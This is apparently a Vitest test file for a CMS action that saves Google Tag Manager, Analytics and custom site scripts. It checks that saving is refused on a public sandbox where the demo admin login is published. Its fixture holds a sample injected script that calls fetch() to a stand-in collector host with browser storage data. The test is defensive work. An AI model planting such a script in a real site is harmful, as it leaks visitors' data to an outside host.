import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

/**
 * The GTM container and the "custom consented scripts" are injected with the CSP nonce for every
 * visitor who accepts analytics. On the public sandbox (NEXT_PUBLIC_IS_SANDBOX === 'true') the demo
 * admin login is published, so the save refuses there, after the admin check and before the form
 * is read or privacy_settings is touched. ConsentGatedAnalytics injects nothing there either.
 */

const REFUSAL = 'Site scripts and tag managers are turned off in the sandbox: they would run for every visitor.';

const mocks = vi.hoisted(() => ({
  role: 'ADMIN' as string | null,
  signedIn: true,
  mergePrivacySettings: vi.fn(),
  revalidatePath: vi.fn(),
}));

vi.mock('@nextblock-cms/db/server', async () => ({
  createClient: () => ({
    auth: { getUser: async () => ({ data: { user: mocks.signedIn ? { id: 'admin-1' } : null } }) },
    from: () => ({
      select: () => ({
        eq: () => ({ single: async () => ({ data: mocks.role ? { role: mocks.role } : null, error: null }) }),
      }),
    }),
  }),
  // The real predicate (a dependency-free module): only the exact string 'true' is the sandbox.
  isSandboxEnvironment: (
    await vi.importActual<{ isSandboxEnvironment: () => boolean }>('../../../../../../libs/db/src/lib/config-resolve')
  ).isSandboxEnvironment,
}));
vi.mock('next/cache', () => ({ revalidatePath: mocks.revalidatePath }));
vi.mock('../../../../lib/privacy/settings', () => ({
  getPrivacySettings: vi.fn(),
  mergePrivacySettings: mocks.mergePrivacySettings,
}));

import { updateGoogleAnalyticsSettings } from './actions';

function analyticsForm() {
  const form = new FormData();
  form.append('gtm_id', ' GTM-ABC1234 ');
  form.append('ga_measurement_id', 'G-XYZ9876');
  form.append('custom_scripts', "<script>fetch('https://collector.example.test?k=' + localStorage.length)</script>");
  return form;
}

beforeEach(() => {
  mocks.role = 'ADMIN';
  mocks.signedIn = true;
  mocks.mergePrivacySettings.mockReset().mockResolvedValue(undefined);
  mocks.revalidatePath.mockClear();
  vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', '');
  vi.spyOn(console, 'error').mockImplementation(() => undefined);
});

afterEach(() => {
  vi.unstubAllEnvs();
  vi.restoreAllMocks();
});

describe('updateGoogleAnalyticsSettings', () => {
  it('refuses the admin on the sandbox without reading the form or saving anything', async () => {
    vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', 'true');
    const form = analyticsForm();
    const read = vi.spyOn(form, 'get');

    await expect(updateGoogleAnalyticsSettings(form)).resolves.toEqual({ ok: false, error: REFUSAL });
    expect(read).not.toHaveBeenCalled();
    expect(mocks.mergePrivacySettings).not.toHaveBeenCalled();
    expect(mocks.revalidatePath).not.toHaveBeenCalled();
  });

  it('still gives a non-admin the admin refusal on the sandbox', async () => {
    vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', 'true');

    mocks.role = 'WRITER';
    await expect(updateGoogleAnalyticsSettings(analyticsForm())).resolves.toEqual({
      ok: false,
      error: 'You do not have permission to perform this action.',
    });
    mocks.signedIn = false;
    await expect(updateGoogleAnalyticsSettings(analyticsForm())).resolves.toEqual({
      ok: false,
      error: 'You must be logged in to update settings.',
    });
    expect(mocks.mergePrivacySettings).not.toHaveBeenCalled();
  });

  it.each(['', 'false', 'TRUE', '1'])('saves the analytics fields as before when NEXT_PUBLIC_IS_SANDBOX=%j', async (value) => {
    vi.stubEnv('NEXT_PUBLIC_IS_SANDBOX', value);

    await expect(updateGoogleAnalyticsSettings(analyticsForm())).resolves.toEqual({
      ok: true,
      message: 'Google Analytics settings saved.',
    });
    expect(mocks.mergePrivacySettings).toHaveBeenCalledWith({
      gtm_id: 'GTM-ABC1234',
      ga_measurement_id: 'G-XYZ9876',
      custom_scripts: "<script>fetch('https://collector.example.test?k=' + localStorage.length)</script>",
    });
    expect(mocks.revalidatePath).toHaveBeenCalledWith('/', 'layout');
  });
});
